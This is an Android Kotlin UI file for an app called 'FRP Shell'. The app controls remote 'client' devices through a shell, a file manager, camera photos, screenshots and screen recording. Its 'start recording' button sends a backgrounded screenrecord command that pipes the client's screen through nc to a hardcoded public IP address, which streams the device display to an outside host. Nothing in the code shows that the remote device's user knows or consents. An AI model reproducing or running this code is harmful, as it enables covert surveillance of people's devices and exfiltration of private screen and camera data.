package com.kgapp.frpshell.ui

import android.content.Context
import android.net.Uri
import android.provider.OpenableColumns
import android.util.Log
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import java.io.File
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Folder
import androidx.compose.material.icons.filled.Image
import androidx.compose.material.icons.filled.Menu
import androidx.compose.material.icons.filled.PhotoCamera
import androidx.compose.material.icons.filled.Save
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.DrawerValue
import androidx.compose.material3.TextButton
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.ModalDrawerSheet
import androidx.compose.material3.ModalNavigationDrawer
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.rememberDrawerState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.SideEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.remember
import androidx.compose.runtime.getValue
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.lifecycle.viewmodel.compose.viewModel
import com.kgapp.frpshell.frp.FrpLogBus
import com.kgapp.frpshell.model.ShellTarget
import com.kgapp.frpshell.ui.theme.FrpShellTheme
import kotlinx.coroutines.launch


import androidx.compose.material.icons.filled.Stop  // 用于停止图标
import androidx.compose.material.icons.filled.Videocam      



import androidx.compose.foundation.layout.padding
import androidx.compose.ui.unit.dp

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainScaffold(vm: MainViewModel = viewModel()) {
    data class PickedUploadFile(val file: File, val displayName: String)
    val uiState by vm.uiState.collectAsState()
    val firstRenderLogged = remember { mutableSetOf<String>() }

    LaunchedEffect(Unit) {
        FrpLogBus.append("[UI] MainScaffold 组合开始")
        Log.i("FrpShellCompose", "MainScaffold 组合开始")
    }

    LaunchedEffect(uiState.screen) {
        FrpLogBus.append("[UI] 状态初始化 screen=${uiState.screen}")
        Log.i("FrpShellCompose", "状态初始化 screen=${uiState.screen}")
    }

    SideEffect {
        val key = "${uiState.screen}|${uiState.fileManagerVisible}|${uiState.fileEditorVisible}|${uiState.screenViewerVisible}"
        if (firstRenderLogged.add(key)) {
            FrpLogBus.append("[UI] 首次渲染完成 key=$key")
            Log.i("FrpShellCompose", "首次渲染完成 key=$key")
        }
    }

    fun copyUriToCache(context: Context, uri: Uri): PickedUploadFile? {
        val displayName = runCatching {
            context.contentResolver.query(uri, arrayOf(OpenableColumns.DISPLAY_NAME), null, null, null)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    cursor.getString(0)
                } else null
            }
        }.getOrNull()?.takeIf { it.isNotBlank() }
            ?: uri.lastPathSegment?.substringAfterLast('/')?.takeIf { it.isNotBlank() }
            ?: "upload.bin"

        return runCatching {
            val target = File(context.cacheDir, "picked_${System.currentTimeMillis()}_${displayName}")
            context.contentResolver.openInputStream(uri)?.use { input ->
                target.outputStream().use { out ->
                    val buffer = ByteArray(4096)
                    while (true) {
                        val read = input.read(buffer)
                        if (read <= 0) break
                        out.write(buffer, 0, read)
                    }
                    out.flush()
                }
            } ?: return null
            PickedUploadFile(file = target, displayName = displayName)
        }.getOrNull()
    }

    FrpShellTheme(themeMode = uiState.themeMode) {
        val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
        val scope = rememberCoroutineScope()
        val context = LocalContext.current
        val uploadLauncher = rememberLauncherForActivityResult(ActivityResultContracts.GetContent()) { uri ->
            val resolved = uri ?: return@rememberLauncherForActivityResult
            val local = copyUriToCache(context, resolved)
            if (local != null) vm.uploadLocalFileToCurrentDirectory(local.file, local.displayName)
        }

        val isSettings = uiState.screen == ScreenDestination.Settings

        ModalNavigationDrawer(
            drawerState = drawerState,
            gesturesEnabled = !isSettings,
            drawerContent = {
                if (!isSettings) {
                    ModalDrawerSheet(modifier = Modifier.fillMaxWidth(0.34f)) {
                        DrawerContent(
                            current = uiState.selectedTarget,
                            clientIds = uiState.clientIds,
                            clientModels = uiState.clientModels,
                            onSelect = {
                                vm.onSelectTarget(it)
                                scope.launch { drawerState.close() }
                            }
                        )
                    }
                }
            }
        ) {
            Scaffold(
                modifier = Modifier.fillMaxSize(),
                topBar = {
                    TopAppBar(
                        title = {
                            Text(
                                if (isSettings) "设置" 
                                else if (uiState.fileEditorVisible) "文件编辑" 
                                else if (uiState.fileManagerVisible) "文件管理" 
                                else if (uiState.screenViewerVisible) "屏幕截图"
                                else "FRP Shell",
                                style = MaterialTheme.typography.titleMedium
                            )
                        },
                        navigationIcon = {
                            IconButton(
                                onClick = {
                                    when {
                                        isSettings -> vm.navigateBackToMain()
                                        uiState.fileEditorVisible -> vm.closeFileEditor()
                                        uiState.fileManagerVisible -> vm.closeFileManager()
                                        uiState.screenViewerVisible -> vm.closeScreenViewer()
                                        else -> scope.launch { drawerState.open() }
                                    }
                                }
                            ) {
                                Icon(
                                    if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) Icons.AutoMirrored.Filled.ArrowBack else Icons.Default.Menu,
                                    contentDescription = if (isSettings || uiState.fileManagerVisible || uiState.fileEditorVisible || uiState.screenViewerVisible) "back" else "open drawer"
                                )
                            }
                        },
                        actions = {
                            if (uiState.fileEditorVisible) {
                                IconButton(onClick = vm::saveEditor) {
                                    Icon(Icons.Default.Save, contentDescription = "save")
                                }
                            } else if (!isSettings && !uiState.screenViewerVisible) {
                                if (!uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client) {
                                IconButton(onClick = { 
                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
            }) {
                Icon(Icons.Default.Videocam, contentDescription = "start recording")
            }
            
            // 结束录屏按钮
            IconButton(onClick = { 
                vm.sendCommand("pkill -9 screenrecord")
            }) {
                Icon(Icons.Default.Stop, contentDescription = "stop recording")
            }
                                
                                    IconButton(onClick = vm::openCameraSelector) {
                                        Icon(Icons.Default.PhotoCamera, contentDescription = "take photo")
                                    }
                                    IconButton(onClick = vm::captureScreen) {
                                        Icon(Icons.Default.Image, contentDescription = "capture screen")
                                    }
                                    IconButton(onClick = vm::openFileManager) {
                                        Icon(Icons.Default.Folder, contentDescription = "file manager")
                                    }
                                }
                                IconButton(onClick = vm::openSettings) {
                                    Icon(Icons.Default.Settings, contentDescription = "settings")
                                }
                            }
                        }
                    )
                }
            ) { padding ->
                when {
                    isSettings -> {
                        SettingsScreen(
                            configContent = uiState.configContent,
                            useSu = uiState.useSu,
                            suAvailable = uiState.suAvailable,
                            themeMode = uiState.themeMode,
                            shellFontSizeSp = uiState.shellFontSizeSp,
                            firstLaunchFlow = uiState.firstLaunchFlow,
                            onConfigChanged = vm::onConfigChanged,
                            onUseSuChanged = vm::onUseSuChanged,
                            onThemeModeChanged = vm::onThemeModeChanged,
                            onShellFontSizeChanged = vm::onShellFontSizeChanged,
                            onSave = vm::saveConfigOnly,
                            onSaveAndRestart = vm::saveAndRestartFrp,
                            contentPadding = padding
                        )
                    }

                    uiState.fileEditorVisible -> {
                        FileEditorScreen(
                            remotePath = uiState.fileEditorRemotePath,
                            content = uiState.fileEditorContent,
                            fontSizeSp = uiState.shellFontSizeSp,
                            contentPadding = padding,
                            onContentChange = vm::onEditorContentChanged,
                            modifier = Modifier.fillMaxSize()
                        )
                    }

                    uiState.screenViewerVisible -> {
                        ScreenViewerScreen(
                            imagePath = uiState.screenViewerImagePath,
                            timestamp = uiState.screenViewerTimestamp,
                            contentPadding = padding
                        )
                    }

                    uiState.fileManagerVisible -> {
                        FileManagerScreen(
                            currentPath = uiState.fileManagerPath,
                            files = uiState.fileManagerFiles,
                            contentPadding = padding,
                            onRefresh = vm::fileManagerRefresh,
                            onBackDirectory = vm::fileManagerBackDirectory,
                            onOpenFile = vm::fileManagerOpen,
                            onEditFile = vm::fileManagerEdit,
                            onDownloadFile = vm::fileManagerDownload,
                            onUploadFile = { uploadLauncher.launch("*/*") },
                            onRename = vm::fileManagerRename,
                            onChmod = vm::fileManagerChmod,
                            onDelete = vm::fileManagerDelete,
                            transferVisible = uiState.fileTransferVisible,
                            transferTitle = uiState.fileTransferTitle,
                            transferDone = uiState.fileTransferDone,
                            transferTotal = uiState.fileTransferTotal,
                            modifier = Modifier.fillMaxSize()
                        )
                    }

                    else -> {
                        ShellScreen(
                            modifier = Modifier.fillMaxSize(),
                            target = uiState.selectedTarget,
                            fontSizeSp = uiState.shellFontSizeSp,
                            commandItems = (uiState.selectedTarget as? ShellTarget.Client)?.let { uiState.shellItemsByClient[it.id].orEmpty() } ?: emptyList(),
                            frpRunning = uiState.frpRunning,
                            onStartFrp = vm::startFrp,
                            onStopFrp = vm::stopFrp,
                            onSend = vm::sendCommand,
                            contentPadding = padding
                        )
                    }
                }
            }

            if (uiState.fileEditorConfirmDiscardVisible) {
                AlertDialog(
                    onDismissRequest = vm::cancelCloseFileEditor,
                    title = { Text("放弃未保存更改？") },
                    text = { Text("当前文件有未保存修改，确定退出编辑器吗？") },
                    confirmButton = {
                        TextButton(onClick = vm::confirmCloseFileEditor) {
                            Text("放弃")
                        }
                    },
                    dismissButton = {
                        TextButton(onClick = vm::cancelCloseFileEditor) {
                            Text("继续编辑")
                        }
                    }
                )
            }

            if (uiState.fileTransferVisible && !uiState.fileManagerVisible) {
                AlertDialog(
                    onDismissRequest = {},
                    title = { Text(uiState.fileTransferTitle) },
                    text = {
                        Column {
                            val progress = if (uiState.fileTransferTotal > 0L) {
                                (uiState.fileTransferDone.toFloat() / uiState.fileTransferTotal.toFloat()).coerceIn(0f, 1f)
                            } else 0f
                            LinearProgressIndicator(progress = { progress }, modifier = Modifier.fillMaxWidth())
                            Text("${uiState.fileTransferDone}/${uiState.fileTransferTotal}")
                        }
                    },
                    confirmButton = {}
                )
            }

            if (uiState.screenCaptureLoading) {
                AlertDialog(
                    onDismissRequest = {},
                    title = { Text(uiState.screenCaptureLoadingText) },
                    text = {
                        Column {
                            Text("请稍候...")
                            LinearProgressIndicator(modifier = Modifier.fillMaxWidth().padding(top = 8.dp))
                            if (uiState.screenCaptureLog.isNotBlank()) {
                                Text(
                                    text = uiState.screenCaptureLog,
                                    style = MaterialTheme.typography.bodySmall,
                                    modifier = Modifier.padding(top = 8.dp),
                                    color = MaterialTheme.colorScheme.onSurfaceVariant
                                )
                            }
                        }
                    },
                    confirmButton = {},
                    dismissButton = {
                        if (uiState.screenCaptureCancelable) {
                            TextButton(onClick = vm::cancelScreenCapture) {
                                Text("取消")
                            }
                        }
                    }
                )
            }

            if (uiState.cameraSelectorVisible) {
                AlertDialog(
                    onDismissRequest = vm::closeCameraSelector,
                    title = { Text("选择摄像头") },
                    text = {
                        Column {
                            (0..3).forEach { id ->
                                TextButton(
                                    onClick = { vm.takePhoto(id) },
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Text("Camera ID: $id")
                                }
                            }
                        }
                    },
                    confirmButton = {},
                    dismissButton = {
                        TextButton(onClick = vm::closeCameraSelector) {
                            Text("取消")
                        }
                    }
                )
            }
        }
    }
}
